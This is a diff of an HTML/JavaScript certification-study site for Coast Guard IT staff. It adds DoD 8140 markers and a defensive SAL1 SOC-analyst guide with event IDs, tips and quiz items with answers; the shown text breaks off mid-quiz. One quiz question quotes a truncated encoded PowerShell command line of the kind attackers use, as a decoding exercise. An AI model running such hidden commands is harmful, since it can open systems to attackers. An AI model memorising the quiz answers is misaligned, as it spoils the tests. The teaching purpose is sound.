@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-wwJXyCNYobuU0+7SZwl5Q8SsUVCwEV8TOoruQuVCLWE=' 'sha256-+9MxalYnSwmjfe08R4MS11SW22d3FMWRYHGfJyXeS8I='; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; worker-src 'self'; manifest-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none'; frame-src 'none'; upgrade-insecure-requests">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-axa0V5iaLnNY9EKjkChz0IPmTeEwjq5OCn4cgakt6Po=' 'sha256-+9MxalYnSwmjfe08R4MS11SW22d3FMWRYHGfJyXeS8I='; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; worker-src 'self'; manifest-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none'; frame-src 'none'; upgrade-insecure-requests">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, interactive-widget=resizes-content">
 <title>CG Cert Path</title>
 <meta name="description" content="Certifications, career paths and funding for Coast Guard IT. Study guides, quizzes and PBQs. Not an official U.S. Coast Guard site.">
@@ -238,6 +238,7 @@ button,summary,[role="button"]{-webkit-user-select:none;user-select:none;-webkit
 .bottom{display:grid}
 .foot{display:flex;justify-content:flex-end;gap:12px;font-family:var(--f-mono);font-size:10px;color:#7f8996}
 .m-disc{display:none}
+.nw{white-space:nowrap}
 #status:empty{display:none}
 
 /* badge tap targets + meta pill under the front badge */
@@ -311,6 +312,8 @@ button,summary,[role="button"]{-webkit-user-select:none;user-select:none;-webkit
 .c-hrs{font:500 12px var(--f-mono);font-variant-numeric:tabular-nums;color:#c9ccd1}
 .c-iat{font:600 10px var(--f-ui);letter-spacing:.12em;text-transform:uppercase;color:var(--v-fg)}
 .c-iat.none{color:var(--v-muted)}
+.c-iat .d8{display:block;font-weight:700;letter-spacing:.1em}
+.c-iat small{display:block;margin-top:2px;font-size:8.5px;letter-spacing:.08em;color:var(--v-muted)}
 .c-chev{font:300 18px var(--f-ui);color:var(--v-muted);transition:transform .3s var(--ez),color .3s var(--ez)}
 .cert.open .c-chev{transform:rotate(45deg);color:var(--v-accent)}
 .c-meta-m{display:contents}
@@ -1562,7 +1565,7 @@ html.kbd .touch-only{display:none}
   <div id="labels"></div>
 
   <header class="top ui">
-    <div class="mark" data-rv="0"><svg class="mk" viewBox="0 0 120 120" aria-hidden="true"><path d="M80 38A34 34 0 1 0 80 86" fill="none" stroke="currentColor" stroke-width="16" stroke-linecap="round"/><circle cx="97" cy="25" r="9" fill="none" stroke="currentColor" stroke-width="6"/></svg><b>cg cert path<sup>&deg;</sup></b><span>v.2.17</span></div>
+    <div class="mark" data-rv="0"><svg class="mk" viewBox="0 0 120 120" aria-hidden="true"><path d="M80 38A34 34 0 1 0 80 86" fill="none" stroke="currentColor" stroke-width="16" stroke-linecap="round"/><circle cx="97" cy="25" r="9" fill="none" stroke="currentColor" stroke-width="6"/></svg><b>cg cert path<sup>&deg;</sup></b><span>v.2.18</span></div>
     <div class="hdr-r" data-rv="1">
     <button type="button" class="hdr-btn srch-btn" id="hdr-search" aria-label="Search certifications" aria-keyshortcuts="Control+K Meta+K /"><svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" aria-hidden="true"><circle cx="7" cy="7" r="4.6"/><path d="M10.4 10.4 14 14"/></svg><span class="sb-l">Search certs</span><kbd class="sb-k kbd-k">Ctrl K</kbd></button>
     <button type="button" class="hdr-btn" id="hdr-explore" aria-label="Open paths, funding and compare"><svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><circle cx="4" cy="4" r="1.7"/><circle cx="12" cy="4" r="1.7"/><circle cx="4" cy="12" r="1.7"/><circle cx="12" cy="12" r="1.7"/></svg></button>
@@ -1578,7 +1581,7 @@ html.kbd .touch-only{display:none}
       </div>
       <div class="st-act" id="st-act"><button type="button" class="st-main" id="st-path">Build my path <small>1 min</small><span class="ar" aria-hidden="true">&rarr;</span></button></div>
       <div class="st-links" id="st-links"><button type="button" data-st="vendors">Browse vendors</button><button type="button" data-st="search">Search a cert</button></div>
-      <p class="st-disc">Not an official U.S. Coast Guard site</p>
+      <p class="st-disc">Not an official U.S. Coast Guard site &middot; <span class="nw">&copy; 2026 Gabriel Rodriguez</span></p>
     </div></div>
     <div class="stage" id="stage"></div>
     <div class="readout" id="readout" aria-live="polite" data-rv="3">
@@ -1594,7 +1597,7 @@ html.kbd .touch-only{display:none}
   </main>
 
   <footer class="bottom ui">
-    <div class="foot" data-rv="4"><span class="m-disc">Not an official U.S. Coast Guard site</span><span id="status"></span></div>
+    <div class="foot" data-rv="4"><span class="m-disc">Not an official U.S. Coast Guard site &middot; <span class="nw">&copy; 2026 Gabriel Rodriguez</span></span><span id="status"></span></div>
   </footer>
 </div>
 
@@ -1693,7 +1696,7 @@ html.kbd .touch-only{display:none}
           </div>
         </div>
         <p class="fine rv-s">*Amount reported by approved CG COOL training vendors; confirm the current cap with ETQC. All roadmap data is a draft and gets verified before launch.</p>
-        <p class="fine rv-s">Not an official U.S. Coast Guard or DoD site. Not affiliated with or endorsed by the U.S. Coast Guard, CompTIA, ISC2, Cisco, TryHackMe, LPI, AWS, Microsoft or WGU. All names are trademarks of their owners.</p>
+        <p class="fine rv-s">Not an official U.S. Coast Guard or DoD site. Not affiliated with or endorsed by the U.S. Coast Guard, CompTIA, ISC2, Cisco, TryHackMe, LPI, AWS, Microsoft or WGU. All names are trademarks of their owners. <span class="nw">&copy; 2026 Gabriel Rodriguez</span>. All rights reserved.</p>
         <p class="fine rv-s">Your data stays on your device. CertPath has no accounts, cookies or analytics; your progress is saved in your browser and you can clear it anytime. The site is hosted on GitHub Pages, which keeps standard server logs.</p>
       </div>
 
@@ -1792,7 +1795,7 @@ var VENDORS = [
   {id:"thm", name:"TryHackMe", short:"THM", lat:12, lon:48, beacon:"#a3ea2a",
    pal:{fg:"#eef3f8",muted:"#9aa7ba",line:"#26334a",surface:"#172133",accent:"#a3ea2a",on:"#10180a"}, grad:["#203048","#111826","#06090f"],
    blurb:"Hands-on, lab-based certs. Proves you can work a SOC queue or a pentest, not just pass a quiz.",
-   certs:[["SAL1 · Security Analyst L1","Entry",2,"40–80 h","",["Cyber eng"]],["PT1 · Junior Pentester","Entry",3,"60–100 h","",["Cyber eng"]]]},
+   certs:[["SAL1 · Security Analyst L1","Entry",2,"60–90 h","",["Cyber eng"]],["PT1 · Junior Pentester","Entry",3,"80–120 h","",["Cyber eng"]]]},
   {id:"lpi", name:"Linux (LPI)", short:"LPI", lat:48, lon:92, beacon:"#f3b61f",
    pal:{fg:"#f6f0e2",muted:"#bbb096",line:"#3a3119",surface:"#1d180d",accent:"#f3b61f",on:"#1a1404"}, grad:["#33290f","#15120a","#070604"],
    blurb:"Linux fundamentals every analyst and admin leans on.",
@@ -1816,6 +1819,10 @@ VENDORS.forEach(function(v){
 });
 var PLANNED=["Objectives","How to study","Free resources","10-question quiz","2 PBQs","Best roadmap"];
 /* one short line per cert for the vendor page's "From the roadmap" panel (shown on hover / select) */
+/* certs on the DoD 8140 foundational qualification matrix (V2.1, effective Sep 19, 2025) for at least one work role.
+   Checked Nov 10, 2026 against vendor pages (CompTIA, ISC2, Cisco) and a matrix export. Everything else is NOT listed. */
+var D8140=["A+","Network+","Security+","Cloud+","CySA+","PenTest+","SecurityX","CC","SSCP","CCSP","CISSP","CyberOps Associate","CCNA","CCNP Security"];
+function is8140(n){return D8140.indexOf(n)>=0;}
 var CERT_NOTE={
   "A+":"Where most IT careers start. Two exams cover hardware, operating systems, networking basics and troubleshooting: the help-desk skills every unit leans on.",
   "Network+":"The networking cert for every IT rating. Subnetting, routing, switching, wireless and troubleshooting, and the setup for Security+ and CCNA.",
@@ -1834,7 +1841,7 @@ var CERT_NOTE={
   "CyberOps Associate":"Cisco's SOC analyst cert. Monitoring, host and network analysis, and responding to security events.",
   "CCNA":"The classic network engineer cert. Routing, switching, IP services, security basics and automation on Cisco gear.",
   "CCNP Security":"Professional-level Cisco security. A core exam plus one specialty, for engineers who run security on Cisco networks.",
-  "SAL1 · Security Analyst L1":"A hands-on SOC cert. Instead of a multiple-choice quiz, you triage alerts and investigate like a junior analyst.",
+  "SAL1 · Security Analyst L1":"A hands-on SOC cert. Most of the score comes from triaging live alerts in a simulated SOC, not from multiple choice.",
   "PT1 · Junior Pentester":"A hands-on pentest cert. You attack lab targets and write up what you found, like a real engagement.",
   "Linux Essentials":"Linux basics: the command line, files, permissions and users. The skills every analyst and admin uses daily.",
   "LPIC-1":"Linux system administration over two exams: installs, packages, the shell, storage, networking and security.",
@@ -2605,7 +2612,7 @@ function openPanel(i,certName){
     '<span class="p-crumb" id="p-crumb"></span><span class="p-mock">Mock data</span>'+
     '<div class="p-arrows"><button type="button" class="p-arr p-srch p-exp" id="p-exp" aria-label="Go to paths, funding and compare"><svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><circle cx="4" cy="4" r="1.7"/><circle cx="12" cy="4" r="1.7"/><circle cx="4" cy="12" r="1.7"/><circle cx="12" cy="12" r="1.7"/></svg><span class="ps-l">Paths &middot; Funding &middot; Compare</span></button><button type="button" class="p-arr p-srch" id="p-srch" aria-label="Search certifications"><svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" aria-hidden="true"><circle cx="7" cy="7" r="4.6"/><path d="M10.4 10.4 14 14"/></svg><span class="ps-l">Search</span></button><button type="button" class="p-arr" id="p-prev" aria-label="Previous vendor">&larr;</button><button type="button" class="p-arr" id="p-next" aria-label="Next vendor">&rarr;</button></div></header>'+
     '<div class="p-body" id="p-body"></div></div>'+
-    '<p class="p-foot">Not an official U.S. Coast Guard or DoD site &middot; Not affiliated with or endorsed by the Coast Guard or any cert vendor &middot; Names are trademarks of their owners</p>'+
+    '<p class="p-foot">Not an official U.S. Coast Guard or DoD site &middot; Not affiliated with or endorsed by the Coast Guard or any cert vendor &middot; Names are trademarks of their owners &middot; <span class="nw">&copy; 2026 Gabriel Rodriguez</span></p>'+
    '</div>';
   panel.querySelector("#p-back").addEventListener("click",function(){if(guideName) closeGuide();else back();});
   panel.querySelector("#p-srch").addEventListener("click",function(){srchShow(this);});
@@ -2638,7 +2645,7 @@ function renderBody(i){
       '<div class="pa-v on" data-cert=""><p class="lab">From the roadmap</p><p class="p-blurb">'+v.blurb+'</p></div>'+
       v.certs.map(function(c){var g=!!GUIDES[c[0]];return '<div class="pa-v" data-cert="'+gEsc(c[0])+'" aria-hidden="true"><p class="lab"><span class="pa-n">'+gEsc(c[0])+'</span> &middot; '+gEsc(c[1])+'</p>'+
         '<p class="p-blurb">'+gEsc(CERT_NOTE[c[0]]||v.blurb)+'</p>'+
-        '<p class="pa-meta"><span>'+gEsc(c[3])+'</span>'+(c[4]?'<span>'+gEsc(c[4])+'</span>':'')+'<span class="'+(g?'g':'')+'">'+(g?(finePointer?'Guide ready &middot; click again to open':'Guide ready &middot; tap again to open'):'Guide coming soon')+'</span></p></div>';}).join("")+
+        '<p class="pa-meta"><span>'+gEsc(c[3])+'</span>'+(is8140(c[0])?'<span>DoD 8140</span>':'')+'<span class="'+(g?'g':'')+'">'+(g?(finePointer?'Guide ready &middot; click again to open':'Guide ready &middot; tap again to open'):'Guide coming soon')+'</span></p></div>';}).join("")+
     '</div></aside></div>'+
     '<div class="flex pr" id="flex" tabindex="0" role="region" aria-roledescription="carousel" aria-label="'+v.name+' certifications">'+
       '<span class="flex-hint lab">'+(finePointer?'Drag to browse &nbsp;&middot;&nbsp; click to focus &nbsp;&middot;&nbsp; click again to open':'Drag &nbsp;&middot;&nbsp; tap to focus &nbsp;&middot;&nbsp; tap again to open')+'</span>'+
@@ -2649,9 +2656,9 @@ function renderBody(i){
     '<div class="p-tools pr"><span class="lab">Ranked by difficulty</span><div class="seg" id="seg" role="group" aria-label="Sort order">'+
       '<button type="button" id="s-hard" aria-pressed="'+hardestFirst+'">Hardest first</button>'+
       '<button type="button" id="s-easy" aria-pressed="'+(!hardestFirst)+'">Easiest first</button><span class="seg-ind" aria-hidden="true"></span></div></div>'+
-    '<div class="c-head pr" aria-hidden="true"><span>#</span><span>Certification</span><span>Difficulty</span><span>Study time</span><span>IAT</span><span></span></div>'+
+    '<div class="c-head pr" aria-hidden="true"><span>#</span><span>Certification</span><span>Difficulty</span><span>Study time</span><span>DoD</span><span></span></div>'+
     '<ol class="certs" id="certs"></ol>'+
-    '<p class="p-note pr">Study hours are rough estimates. IAT levels come from the old DoD 8570 baseline, which job posts still use; the live site will also show each cert\'s DoD 8140 work role and proficiency level. All details get verified before launch.</p>';
+    '<p class="p-note pr">Study hours are rough estimates. 8140 marks certs on the DoD 8140 qualification matrix (V2.1, checked Nov 10, 2026) for at least one work role; whether one counts for you depends on your billet\'s work role and level. The small IAT level under it is the old 8570 baseline that job posts still quote. A dash means not on the matrix.</p>';
   requestAnimationFrame(function(){var sg=panel.querySelector("#seg");if(sg) placeSeg(sg);});
   buildCerts(v);
   if(flex){flex.destroy();flex=null;}
@@ -2736,7 +2743,7 @@ function buildCerts(v){
         '<span class="c-meta-m">'+
           '<span class="c-diff" role="img" aria-label="Difficulty '+c[2]+' of 5">'+bars+'</span>'+
           '<span class="c-hrs">'+c[3]+'</span>'+
-          '<span class="c-iat'+(c[4]?"":" none")+'">'+(c[4]||"—")+'</span>'+
+          (is8140(c[0])?'<span class="c-iat" title="On the DoD 8140 qualification matrix"><b class="d8">8140</b>'+(c[4]?'<small>'+c[4]+'</small>':'')+'</span>':'<span class="c-iat none" title="Not on the DoD 8140 matrix">—</span>')+
         '</span>'+
         '<span class="c-chev" aria-hidden="true">+</span>'+
       '</button>'+
@@ -2837,7 +2844,7 @@ function ptInit(){
 }
 function ptMeta(name){
   var f=findCert(name), c=f.c, v=VENDORS[f.v];
-  return {v:v,c:c,col:v?v.beacon:"#bcd6ea",lvl:c?c[1]:"",dif:c?c[2]:0,hrs:c?c[3]:"",iat:c&&c[4]?c[4]:"",g:!!GUIDES[name]};
+  return {v:v,c:c,col:v?v.beacon:"#bcd6ea",lvl:c?c[1]:"",dif:c?c[2]:0,hrs:c?c[3]:"",iat:c&&c[4]?c[4]:"",d8:is8140(name),g:!!GUIDES[name]};
 }
 function ptShow(i,openStep,anim1){
   PT.track=i;PT.open=-1;
@@ -2855,7 +2862,7 @@ function ptShow(i,openStep,anim1){
     h+='<li class="pt-st'+(have?' have':'')+'" style="--c:'+gEsc(m.col)+';--n:'+gEsc(nx)+';--k:'+k+'">'+
       '<button type="button" class="pt-n" data-pstep="'+k+'" aria-expanded="false" aria-controls="pt-m'+k+'">'+
         '<span class="pt-dot" aria-hidden="true">'+(have?'&#10003;':pad2(k+1))+'</span>'+
-        '<span class="pt-t"><b>'+gEsc(st[0])+'</b><small>'+gEsc((m.v?m.v.name:"")+(m.lvl?" · "+m.lvl:"")+(m.hrs?" · "+m.hrs:"")+(m.iat?" · "+m.iat:""))+'</small></span>'+
+        '<span class="pt-t"><b>'+gEsc(st[0])+'</b><small>'+gEsc((m.v?m.v.name:"")+(m.lvl?" · "+m.lvl:"")+(m.hrs?" · "+m.hrs:"")+(m.d8?" · DoD 8140":""))+'</small></span>'+
         '<span class="pt-tags">'+(have?'<em class="pt-have">Have it</em>':'')+(m.g?'<em>Guide</em>':'')+'</span>'+
         '<span class="pt-chev" aria-hidden="true">+</span></button>'+
       '<div class="pt-more" id="pt-m'+k+'" inert><div class="pt-in">'+
@@ -3148,8 +3155,9 @@ function cmpInfo(name){
 }
 function cmpDots(n){var h='<span class="cm-dots" role="img" aria-label="Difficulty '+n+' of 5">';for(var i=1;i<=5;i++) h+='<i'+(i<=n?' class="on"':'')+'></i>';return h+'</span>';}
 function cmpFact(I,k){var x=I.F[k];return x?{v:x[1],s:x[2]}:null;}
+function cmpD8(I){return is8140(I.name)?{v:"Approved",s:"on the DoD 8140 matrix"}:{v:"Not listed",s:"not on the 8140 matrix"};}
 function cmpDod(I){
-  var d=I.F["DoD 8570"]||I.F["DoD 8140"];
+  var d=I.F["DoD 8570"];
   if(d){var sub=String(d[2]||"").replace(/^\u00b7\s*/,"");return /^\d+$/.test(d[1])?{v:d[1]+" "+sub,s:d[0]}:{v:d[1],s:(sub?sub+" \u00b7 ":"")+d[0]};}
   return I.c[4]?{v:I.c[4],s:"DoD 8570"}:null;
 }
@@ -3181,7 +3189,8 @@ function cmpRows(A,B){
   sec("At a glance.");
   row("Level",{html:'<b>'+gEsc(A.c[1])+'</b>'+cmpDots(A.c[2])},{html:'<b>'+gEsc(B.c[1])+'</b>'+cmpDots(B.c[2])});
   row("Study time",{v:A.c[3],s:"≈ "+Math.max(1,Math.ceil(A.hours/10))+" weeks at 10 h a week"},{v:B.c[3],s:"≈ "+Math.max(1,Math.ceil(B.hours/10))+" weeks at 10 h a week"},cmpBetter(A.hours,B.hours,"Less time"));
-  row("DoD level",cmpDod(A),cmpDod(B));
+  row("DoD 8140",cmpD8(A),cmpD8(B));
+  row("DoD 8570",cmpDod(A),cmpDod(B));
   function pathsOf(I){return I.paths.length?{html:I.paths.map(function(p){return '<b class="cm-p">'+gEsc(p.name)+'<small>step '+p.i+' of '+p.n+'</small></b>';}).join("")}:{html:'<span class="cm-na">Not on a CertPath track</span>'};}
   row("Career paths",pathsOf(A),pathsOf(B));
   row("WGU degree",{v:MP_WGU[A.name]?"Counts toward it":"Not part of it"},{v:MP_WGU[B.name]?"Counts toward it":"Not part of it"});
@@ -5610,6 +5619,439 @@ function gEsc(s){return String(s).replace(/[&<>"']/g,function(c){return {"&":"&a
 /* keyboard focus goes to the visible back button: the Jump to bar's in a guide, the top bar's on a vendor page */
 function focusBack(){var b=panel.querySelector(guideName?"#g-nav-back":"#p-back");if(b) b.focus({preventScroll:true});}
 function setBackLabel(t){var l=panel.querySelector("#p-back .pb-l");if(l) l.textContent=t;var b=panel.querySelector("#p-back");if(b) b.setAttribute("aria-label",t==="Globe"?"Back to the globe":"Back to "+t);}
+GUIDES["SAL1 · Security Analyst L1"]={
+  id:"sal1",
+  title:"SAL1",
+  lead:"TryHackMe's Security Analyst Level 1 cert. Most of the score comes from working real alerts in a simulated SOC: you triage them, decide true or false positive, escalate the right ones and write case reports. It proves you can do the Tier 1 analyst job, not just describe it.",
+  checked:"Nov 10, 2026",
+  planHours:80,
+  laneOnly:["Cyber"],
+  objSub:"Five topic areas from TryHackMe's SAL1 training content. Tick objectives as you study them; progress saves on this device.",
+  planSub:"Set how many hours a week you can give it. The plan splits about 80 hours across the five areas (the SOC Level 1 path alone is about 65 hours of labs), then saves the last stretch for SOC Simulator practice.",
+  pbqSub:"Hands-on practice in the style of the SOC Simulator, the part of the exam worth 800 of 1,000 points.",
+  versions:{
+    cur:{code:"SAL1",label:"Current exam",status:"Launched 2025 · passing 750 of 1000",
+      note:"One exam, three parts, in order: 80 multiple-choice questions in 1 hour (200 points), then two SOC Simulator scenarios of 2 hours each (400 points each). All of it has to be done inside a 24-hour window that starts when you begin.",
+      numbered:false,onote:"TryHackMe lists these five areas without weights. The bars are a suggested study share, tilted toward areas 3 to 5 because the SOC Simulator (80% of the score) leans on them.",
+      domains:[
+        {n:"1.0",name:"Fundamental Knowledge",w:15,obj:[
+          ["Network essentials","TCP/IP, common ports, DNS, HTTP and how normal traffic looks, so the strange traffic stands out."],
+          ["Operating system basics","Windows and Linux processes, services, users, file systems and where each one keeps its logs."],
+          ["Cryptography basics","Hashing versus encryption, certificates and TLS, and why encoded (Base64) is not encrypted."],
+          ["Cloud and virtualisation basics","Virtual machines, containers and cloud accounts, and how they show up in your alerts."],
+          ["Web and scripting basics","HTTP requests and responses, HTML and JavaScript, and reading PowerShell, Bash and Python well enough to tell what a script does."]]},
+        {n:"2.0",name:"Cybersecurity Frameworks",w:15,obj:[
+          ["Cybersecurity fundamentals","The CIA triad, defense in depth, least privilege and the blue team's role."],
+          ["MITRE ATT&CK","Tactics (the why), techniques and sub-techniques (the how), and mapping an alert to them."],
+          ["Cyber Kill Chain","Recon, weaponization, delivery, exploitation, installation, command and control, actions on objectives."],
+          ["NIST Cybersecurity Framework","Govern, Identify, Protect, Detect, Respond and Recover, and where a SOC sits in it."],
+          ["Attack traces and indicators","IOCs (hashes, IPs, domains) versus behaviors, and the Pyramid of Pain."]]},
+        {n:"3.0",name:"Common Malicious Behaviour",w:25,obj:[
+          ["Social engineering","Phishing, spoofed senders, lookalike domains and credential-harvesting pages. Read headers: SPF, DKIM, DMARC, Reply-To."],
+          ["Network attacks","Port scans, brute force and password spraying, man-in-the-middle and data exfiltration."],
+          ["Web exploitation","SQL injection, XSS, path traversal, file upload abuse and web shells, as they look in web server logs."],
+          ["Endpoint attacks","Malicious macros, credential dumping, persistence through scheduled tasks, services and Run keys."],
+          ["Command and control","Beaconing, DNS tunneling and traffic to new or rare domains."],
+          ["Malware and LOLBAS","Malware types, and attackers living off the land with built-in tools like PowerShell, certutil and rundll32."]]},
+        {n:"4.0",name:"Security Tools of the Trade",w:20,obj:[
+          ["Endpoint detection and response (EDR)","Process trees, isolating a host, and reading what ran, from where and by whom."],
+          ["Network and web protection","Firewalls, IDS/IPS (Snort rules), proxies and web application firewalls."],
+          ["Security information and event management (SIEM)","Searching logs in Splunk (SPL) and Elastic (KQL), building timelines and pivoting between fields."],
+          ["Security orchestration and automation (SOAR)","Playbooks that enrich and respond automatically, and what still needs a human."],
+          ["Threat intelligence platforms","Checking hashes, IPs and domains against threat intel (VirusTotal, AbuseIPDB and similar)."],
+          ["Vulnerability scanning","What scanners find, and why a scanner can set off alerts of its own."]]},
+        {n:"5.0",name:"SOC Workflows and Activities",w:25,obj:[
+          ["SOC team and responsibilities","L1, L2 and L3 roles, and what Tier 1 owns: the alert queue."],
+          ["Common security activities","Monitoring, triage, phishing review, threat hunting support and reporting."],
+          ["Alert triage and ticketing","Classify true or false positive, set severity, document evidence and close or hand off."],
+          ["SOC metrics and lookups","MTTD, MTTA, MTTR, false positive rate, and lookup tables and workbooks that speed up triage."],
+          ["Escalation and communication","When and how to escalate, what to put in the ticket, and writing a clear case report."]]}
+      ]}
+  },
+  extras:[
+    {kind:"steps",title:"Triage one alert",sub:"5.0 · the SOC Simulator loop",rows:[
+      "Read the alert: rule name, host, user, time and severity.",
+      "Get context: who is the user, what is the host, is this normal for them?",
+      "Investigate in the SIEM and EDR: what happened before and after?",
+      "Check every IOC (hash, IP, domain) against threat intel.",
+      "Decide: true positive or false positive, with the evidence that proves it.",
+      "Escalate true positives that need action; close the rest with notes.",
+      "Write the case report: who, what, when, where, why and how."]},
+    {kind:"rows",wide:true,title:"Windows events every L1 knows",sub:"3.0 · 4.0 · Security log and Sysmon",rows:[
+      ["4624","Logon succeeded","Logon type 2 is at the keyboard, 3 is over the network, 10 is RDP."],
+      ["4625","Logon failed","Many in a row from one source is brute force; one password across many users is spraying."],
+      ["4688","Process created","Needs command-line logging turned on to show the full command."],
+      ["4720","User account created","A new account outside a change ticket is a red flag."],
+      ["4732","Added to a local group","Watch the Administrators group."],
+      ["4698","Scheduled task created","A common way attackers survive a reboot."],
+      ["7045","Service installed","Another persistence trick, and how PsExec shows up."],
+      ["1102","Security log cleared","Almost never normal. Someone may be hiding tracks."],
+      ["Sysmon 1","Process create","Parent and child process plus full command line and hashes."],
+      ["Sysmon 3","Network connection","Which process talked to which IP and port."]]},
+    {kind:"rows",title:"Pyramid of Pain",sub:"2.0 · how much it hurts the attacker",rows:[
+      ["Hashes","Trivial","Change one byte and the hash is new."],
+      ["IPs","Easy","Attackers swap servers fast."],
+      ["Domains","Simple","New domains are cheap."],
+      ["Artifacts","Annoying","Registry keys, file paths, user agents."],
+      ["Tools","Challenging","They have to find or build new tools."],
+      ["TTPs","Tough","They have to change how they work. Detect these."]]},
+    {kind:"rows",title:"SOC metrics",sub:"5.0 · what your team is measured on",rows:[
+      ["MTTD","Mean time to detect","Attack starts to alert fires."],
+      ["MTTA","Mean time to acknowledge","Alert fires to an analyst picks it up."],
+      ["MTTR","Mean time to respond","Alert to the threat being contained."],
+      ["FP rate","False positive rate","Share of alerts that weren't real. High means rules need tuning."]]}
+  ],
+  facts:[["Questions","80","MCQ + 2 sims"],["Time","5","hours of work"],["Passing","750","of 1000"],["Format","MCQ","+ SOC Simulator"],["Study","60–90","hours"],["Voucher","$349","US price"],["Valid","3","years"],["Window","24","hours"]],
+  method:[
+    ["Map","Use the five areas above as your checklist. Areas 3 to 5 carry the simulator, and the simulator carries 80% of the score."],
+    ["Learn","Work through TryHackMe's Cyber Security 101 path, then the SOC Level 1 path (14 modules, about 65 hours of labs)."],
+    ["Do","Run the SOC Simulator scenarios again and again until triage, escalation and the case report feel routine."],
+    ["Recall","Flashcards for event IDs, ports, ATT&CK tactics, kill chain phases and phishing header fields."],
+    ["Test","Time yourself: 80 questions in 60 minutes, then a 2-hour simulator run with the report written before the clock ends."]],
+  tips:[
+    ["Close what you can prove","Close every alert you've worked before each 2-hour clock runs out. Alerts left open when time expires don't score."],
+    ["Reports are points","Case reports are worth 100 of the 400 points in each scenario. Use who, what, when, where, why and how every time."],
+    ["Don't over-escalate","Escalate true positives that need action. Escalating everything costs points like missing things does."],
+    ["Pace the MCQ","80 questions in 60 minutes is 45 seconds each. Don't get stuck; it's only 200 of the 1,000 points."],
+    ["Plan your 24 hours","It isn't proctored and you can break between parts, but the window runs nonstop once you start."]],
+  resources:[
+    {group:"Official",items:[
+      ["SAL1 certification page","TryHackMe","https://tryhackme.com/certification/security-analyst-level-1","Paid","Price, what the purchase includes and how to book."],
+      ["SAL1 training content","TryHackMe Help Center","https://help.tryhackme.com/en/articles/10625003-sal1-training-content","Free","The five topic areas the exam covers. The checklist above comes from here."],
+      ["Exam format and scoring","TryHackMe Help Center","https://help.tryhackme.com/en/articles/10625043-exam-scoring","Free","How the 1,000 points split across the MCQ and the two scenarios."]]},
+    {group:"Training paths (legal labs)",items:[
+      ["Cyber Security 101 path","TryHackMe","https://tryhackme.com/path/outline/cybersecurity101","Free tier","The foundations TryHackMe recommends before SOC Level 1."],
+      ["SOC Level 1 path","TryHackMe","https://tryhackme.com/path/outline/soclevel1","Paid","14 modules and 65 labs from triage to SIEM. Ends with capstone challenges like Tempest and Boogeyman."],
+      ["SOC Simulator","TryHackMe","https://tryhackme.com/soc-sim","Free tier","The alert-queue tool the exam uses, with Splunk and an analyst VM. Start with the intro scenarios and repeat them until triage feels routine."]]},
+    {group:"Free practice",items:[
+      ["Boss of the SOC (BOTS) datasets","Splunk","https://github.com/splunk/botsv3","Free","Real attack data to search in your own Splunk."],
+      ["Blue Team Labs Online","Security Blue Team","https://blueteamlabs.online","Free tier","Investigation challenges on logs, PCAPs and phishing emails."],
+      ["MITRE ATT&CK","MITRE","https://attack.mitre.org","Free","Look up every technique an alert maps to."],
+      ["LOLBAS","LOLBAS Project","https://lolbas-project.github.io","Free","Windows tools attackers abuse, and how each one shows up."]]}
+  ],
+  quiz:[
+    {d:"1.0",q:"A firewall alert shows HR-PC12 making an outbound TCP connection to 203.0.113.50 on port 3389. The user works in HR and has no IT duties. What is this traffic MOST likely, and why does it matter?",
+     o:[["RDP to a host on the internet. Users don't normally RDP out, so it may be a tunnel or data leaving","Right. 3389 is RDP. An HR workstation opening RDP to an outside address isn't normal and is worth investigating."],
+        ["SSH to a cloud server, which is normal admin work","SSH is port 22, and an HR user has no admin work to do."],
+        ["HTTPS web browsing, which is normal","HTTPS is port 443. Port 3389 is RDP."],
+        ["SMB file sharing with a partner","SMB is port 445, and SMB to the internet would be its own red flag."]],a:0},
+    {d:"1.0",q:"A process command line contains -enc JABjAGwAaQBlAG4AdAA9AA... What should you do FIRST to understand it?",
+     o:[["Base64-decode it (it's UTF-16LE) to read the PowerShell it runs","Right. -enc takes Base64-encoded PowerShell. Encoding hides it from a quick look but doesn't protect it. Decode it, for example in CyberChef."],
+        ["Try to crack it with hashcat","It isn't a hash. Base64 is an encoding and reverses instantly."],
+        ["Ask the user for the decryption key","There is no key. Base64 is encoding, not encryption."],
+        ["Close it: encoded commands are always admin scripts","Attackers use -enc all the time to hide commands. You have to read it before you close anything."]],a:0},
+    {d:"2.0",q:"Your team keeps blocking a phishing kit's IP addresses, and the attacker keeps coming back from new ones. On the Pyramid of Pain, what kind of detection would hurt the attacker MOST?",
+     o:[["One based on their TTPs, such as Office apps spawning PowerShell","Right. TTPs sit at the top of the pyramid. Changing how they operate costs the attacker much more than buying a new IP."],
+        ["Blocking the file hashes of their attachments","Hashes are at the bottom: change one byte and the hash is new."],
+        ["Blocking their domain names","Domains are cheap and easy to replace, just a step above IPs."],
+        ["Blocking more IP addresses faster","IPs are near the bottom. The attacker swaps them faster than you can block them."]],a:0},
+    {d:"2.0",q:"A user opened a macro document. The macro downloaded a DLL, and the DLL created a scheduled task that runs it at every logon. Which Cyber Kill Chain phase does the scheduled task represent?",
+     o:[["Installation","Right. Installation is the attacker setting up a foothold that survives, like a scheduled task (persistence)."],
+        ["Delivery","Delivery was the email that brought the document."],
+        ["Exploitation","Exploitation was the macro running code when the document opened."],
+        ["Actions on objectives","That's the end goal, like stealing or encrypting data. Nothing like that has happened yet."]],a:0},
+    {d:"2.0",q:"An alert maps to MITRE ATT&CK T1059.001. What does that ID tell you?",
+     o:[["A sub-technique (PowerShell) of Command and Scripting Interpreter, under the Execution tactic","Right. T1059 is the technique, .001 is the PowerShell sub-technique, and it sits under the Execution tactic (the attacker's goal: run code)."],
